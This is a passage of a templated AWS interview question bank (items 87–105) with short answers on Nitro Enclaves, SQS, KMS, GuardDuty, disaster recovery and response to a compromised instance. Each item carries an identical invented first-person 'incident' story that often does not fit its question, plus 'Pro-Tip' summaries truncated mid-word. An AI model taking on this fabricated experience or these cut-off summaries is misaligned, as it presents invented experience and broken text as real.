<a id="scenario-87-aws-q71-what-is-aws-nitro-enclaves-and-what-problem-does-it-solve-l3"></a>
### 87. AWS Q71: What is AWS Nitro Enclaves and what problem does it solve [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS Nitro Enclaves and what problem does it solve?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Nitro Enclaves create isolated compute environments within EC2 instances for processing highly sensitive data (cryptographic keys, PII). The enclave has no external network, no persistent storage, and no admin access — even the instance owner can't access enclave memory.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Nitro Enclaves create isolated compute environments within EC2 instances for processing highly sensitive data (cryptographic keys,.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Nitro Enclaves create isolated compute environments within EC2 instances for processing highly
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-88-aws-q72-youre-exceeding-the-5-vpc-limit-per-region-what-do-you-do-l2"></a>
### 88. AWS Q72: Youre exceeding the 5 VPC limit per region What do you do [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You're exceeding the 5 VPC limit per region. What do you do?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Request a limit increase via AWS Service Quotas. Or redesign to use fewer VPCs with more subnets. Or use a shared VPC (Resource Access Manager) that other accounts attach to.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Request a limit increase via AWS Service Quotas. Or redesign to use fewer VPCs with more subnets. Or use a shared VPC (Resource Ac.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Request a limit increase via AWS Service Quotas. Or redesign to use fewer VPCs with more subnet
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-89-aws-q73-how-does-auto-scaling-determine-when-to-scale-in-vs-scale-out-l2"></a>
### 89. AWS Q73: How does Auto Scaling determine when to scale in vs scale out [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How does Auto Scaling determine when to scale in vs scale out?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Based on scaling policies: target tracking (maintain metric at target, e.g., 70% CPU), step scaling (scale by N instances when metric crosses threshold), scheduled scaling (scale at specific times). Scale-in has a cooldown period to prevent thrashing.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Based on scaling policies: target tracking (maintain metric at target, e.g., 70% CPU), step scaling (scale by N instances when met.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Based on scaling policies: target tracking (maintain metric at target, e.g., 70% CPU), step sca
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-90-aws-q74-you-need-to-query-data-across-multiple-aws-accounts-using-sql-what-service-do-you-use-l3"></a>
### 90. AWS Q74: You need to query data across multiple AWS accounts using SQL What service do you use [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to query data across multiple AWS accounts using SQL. What service do you use?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

AWS Athena with Lake Formation for cross-account data access. Or use Amazon Redshift data sharing for analytics. Athena queries S3 data using SQL — set up S3 cross-account access and point Athena at the bucket.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: AWS Athena with Lake Formation for cross-account data access. Or use Amazon Redshift data sharing for analytics. Athena queries S3.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: AWS Athena with Lake Formation for cross-account data access. Or use Amazon Redshift data shari
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-91-aws-q75-your-sqs-consumer-occasionally-processes-the-same-message-twice-how-do-you-handle-this-l2"></a>
### 91. AWS Q75: Your SQS consumer occasionally processes the same message twice How do you handle this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your SQS consumer occasionally processes the same message twice. How do you handle this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Implement idempotent consumers — use a message ID to track processed messages (store in DynamoDB). If already processed, skip. Also: use SQS FIFO queues for exactly-once processing (within a message group).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Implement idempotent consumers — use a message ID to track processed messages (store in DynamoDB). If already processed, skip. Als.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Implement idempotent consumers — use a message ID to track processed messages (store in DynamoD
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-92-aws-q76-what-is-the-difference-between-vertical-and-horizontal-scaling-and-which-does-aws-encourage-l2"></a>
### 92. AWS Q76: What is the difference between vertical and horizontal scaling and which does AWS encourage [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between vertical and horizontal scaling and which does AWS encourage?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Vertical = bigger instance. Horizontal = more instances. AWS encourages horizontal (Auto Scaling Groups, ECS/EKS). Vertical is limited (max instance size) and requires downtime. Horizontal is theoretically unlimited and can be automated.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Vertical = bigger instance. Horizontal = more instances. AWS encourages horizontal (Auto Scaling Groups, ECS/EKS). Vertical is lim.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Vertical = bigger instance. Horizontal = more instances. AWS encourages horizontal (Auto Scalin
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-93-aws-q77-how-would-you-implement-a-zero-trust-network-architecture-in-aws-l3"></a>
### 93. AWS Q77: How would you implement a zero-trust network architecture in AWS [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How would you implement a zero-trust network architecture in AWS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Remove all implicit trust. Use: IAM everywhere (not network location), security groups per-service (not per-subnet), mutual TLS between services, VPC endpoints instead of internet, AWS PrivateLink for inter-service, GuardDuty + Security Hub for continuous threat detection, AWS Verified Access for user-to-app access without VPN.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Remove all implicit trust. Use: IAM everywhere (not network location), security groups per-service (not per-subnet), mutual TLS be.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Remove all implicit trust. Use: IAM everywhere (not network location), security groups per-serv
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-94-aws-q78-a-cloudformation-stack-is-in-update-rollback-failed-state-how-do-you-recover-l2"></a>
### 94. AWS Q78: A CloudFormation stack is in UPDATE_ROLLBACK_FAILED state How do you recover [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A CloudFormation stack is in `UPDATE_ROLLBACK_FAILED` state. How do you recover?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use `continue-update-rollback` API. It lets you specify resources to skip during rollback so the rollback can complete. After rollback completes, investigate and fix the underlying issue.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use continue-update-rollback API. It lets you specify resources to skip during rollback so the rollback can complete. After rollba.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use continue-update-rollback API. It lets you specify resources to skip during rollback so the
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-95-aws-q79-how-do-you-prevent-accidental-deletion-of-an-s3-bucket-with-important-data-l2"></a>
### 95. AWS Q79: How do you prevent accidental deletion of an S3 bucket with important data [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you prevent accidental deletion of an S3 bucket with important data?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Enable S3 Versioning + MFA Delete. Enable S3 Object Lock (WORM). Use a bucket policy with Deny for `s3:DeleteBucket`. Enable AWS Config rule that alerts on deletion attempts.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Enable S3 Versioning + MFA Delete. Enable S3 Object Lock (WORM). Use a bucket policy with Deny for s3:DeleteBucket. Enable AWS Con.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Enable S3 Versioning + MFA Delete. Enable S3 Object Lock (WORM). Use a bucket policy with Deny
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-96-aws-q80-you-need-to-implement-a-dr-disaster-recovery-strategy-for-a-business-critical-app-on-aws-walk-me-through-options-l3"></a>
### 96. AWS Q80: You need to implement a DR (Disaster Recovery) strategy for a business-critical app on AWS Walk me through options [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to implement a DR (Disaster Recovery) strategy for a business-critical app on AWS. Walk me through options."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Options by RPO/RTO: Backup & Restore (hours RPO/RTO, cheapest) → Pilot Light (critical infra always on, warm data, minutes to hours) → Warm Standby (scaled-down copy always running, minutes) → Multi-Site Active-Active (near-zero RPO/RTO, most expensive). Choose based on cost vs business SLA.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Options by RPO/RTO: Backup & Restore (hours RPO/RTO, cheapest) → Pilot Light (critical infra always on, warm data, minutes to hour.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Options by RPO/RTO: Backup & Restore (hours RPO/RTO, cheapest) → Pilot Light (critical infra al
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-97-aws-q81-what-is-aws-guardduty-l2"></a>
### 97. AWS Q81: What is AWS GuardDuty [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS GuardDuty?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Intelligent threat detection service. Analyzes CloudTrail, VPC Flow Logs, DNS logs. Detects: compromised instances communicating with malware C&C, credential theft, Bitcoin mining, unusual API calls from unusual geos. Enable in all regions, integrate with Security Hub.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Intelligent threat detection service. Analyzes CloudTrail, VPC Flow Logs, DNS logs. Detects: compromised instances communicating w.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Intelligent threat detection service. Analyzes CloudTrail, VPC Flow Logs, DNS logs. Detects: co
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-98-aws-q82-an-ec2-instance-is-making-unexpected-outbound-connections-to-unknown-ips-what-do-you-do-l2"></a>
### 98. AWS Q82: An EC2 instance is making unexpected outbound connections to unknown IPs What do you do [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An EC2 instance is making unexpected outbound connections to unknown IPs. What do you do?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

1) Isolate: change security group to block all outbound. 2) Take a snapshot (forensics). 3) Check VPC Flow Logs for the outbound connections. 4) Check GuardDuty findings. 5) Check running processes on instance. Likely compromised. Don't just terminate — preserve evidence first.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: 1) Isolate: change security group to block all outbound. 2) Take a snapshot (forensics). 3) Check VPC Flow Logs for the outbound c.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: 1) Isolate: change security group to block all outbound. 2) Take a snapshot (forensics). 3) Che
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-99-aws-q83-how-does-aws-kms-work-and-when-would-you-use-customer-managed-keys-vs-aws-managed-keys-l3"></a>
### 99. AWS Q83: How does AWS KMS work and when would you use customer-managed keys vs AWS-managed keys [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How does AWS KMS work and when would you use customer-managed keys vs AWS-managed keys?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

KMS generates and stores encryption keys. You never handle raw key material. AWS-managed keys: automatic rotation, free, no management needed — use for basic encryption. Customer-managed keys: you control rotation, key policy, who can use the key — required when: you need cross-account access, specific compliance requirements, need to disable/delete the key.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: KMS generates and stores encryption keys. You never handle raw key material. AWS-managed keys: automatic rotation, free, no manage.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: KMS generates and stores encryption keys. You never handle raw key material. AWS-managed keys:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-100-aws-q84-what-is-amazon-eventbridge-and-how-does-it-differ-from-sns-l2"></a>
### 100. AWS Q84: What is Amazon EventBridge and how does it differ from SNS [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is Amazon EventBridge and how does it differ from SNS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

EventBridge = event bus that routes events from AWS services (EC2, S3, CodePipeline) and custom apps to Lambda, SQS, SNS, Step Functions. Content-based routing (route based on event fields). SNS = simple pub/sub, filter by attributes. EventBridge is richer — 100+ AWS service integrations, schema registry, event replay.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: EventBridge = event bus that routes events from AWS services (EC2, S3, CodePipeline) and custom apps to Lambda, SQS, SNS, Step Fun.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: EventBridge = event bus that routes events from AWS services (EC2, S3, CodePipeline) and custom
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-101-aws-q85-you-want-to-run-your-application-in-multiple-aws-regions-what-data-challenges-do-you-face-l2"></a>
### 101. AWS Q85: You want to run your application in multiple AWS regions What data challenges do you face [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You want to run your application in multiple AWS regions. What data challenges do you face?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Data consistency (cross-region replication has latency), data sovereignty (some data can't leave specific regions), cost (cross-region data transfer fees), conflict resolution for active-active writes. Solutions: DynamoDB Global Tables (multi-master), Aurora Global Database (read-only replica regions), S3 Cross-Region Replication.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Data consistency (cross-region replication has latency), data sovereignty (some data can't leave specific regions), cost (cross-re.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Data consistency (cross-region replication has latency), data sovereignty (some data can't leav
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-102-aws-q86-design-a-serverless-data-pipeline-for-ingesting-1m-events-per-day-l3"></a>
### 102. AWS Q86: Design a serverless data pipeline for ingesting 1M events per day [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Design a serverless data pipeline for ingesting 1M events per day."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

API Gateway or Kinesis Data Streams (ingestion) → Kinesis Firehose (buffer/batch) → S3 (raw data lake) → Glue crawler (schema discovery) → Athena (query) → QuickSight (visualization). For real-time processing: Kinesis Data Analytics or Lambda.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: API Gateway or Kinesis Data Streams (ingestion) → Kinesis Firehose (buffer/batch) → S3 (raw data lake) → Glue crawler (schema disc.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: API Gateway or Kinesis Data Streams (ingestion) → Kinesis Firehose (buffer/batch) → S3 (raw dat
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-103-aws-q87-what-is-the-difference-between-kinesis-data-streams-and-sqs-l2"></a>
### 103. AWS Q87: What is the difference between Kinesis Data Streams and SQS [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between Kinesis Data Streams and SQS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Kinesis: ordered stream, multiple consumers can read same data, data retained 24h-365 days, good for analytics and fan-out. SQS: queue, message deleted after consumed, at-least-once delivery, simpler programming model, good for decoupling services. Use Kinesis for streaming analytics, SQS for task queues.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Kinesis: ordered stream, multiple consumers can read same data, data retained 24h-365 days, good for analytics and fan-out. SQS: q.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Kinesis: ordered stream, multiple consumers can read same data, data retained 24h-365 days, goo
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-104-aws-q88-an-ecs-service-task-is-running-but-the-alb-shows-it-as-unhealthy-l2"></a>
### 104. AWS Q88: An ECS service task is running but the ALB shows it as unhealthy [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An ECS service task is running but the ALB shows it as unhealthy."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Check ECS task security group allows ALB security group on the container port. Check the health check path returns 200 on that port. Check task is fully started (health check grace period too short?).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Check ECS task security group allows ALB security group on the container port. Check the health check path returns 200 on that por.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Check ECS task security group allows ALB security group on the container port. Check the health
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-105-aws-q89-how-do-you-implement-infrastructure-drift-detection-l3"></a>
### 105. AWS Q89: How do you implement infrastructure drift detection [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you implement infrastructure drift detection?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

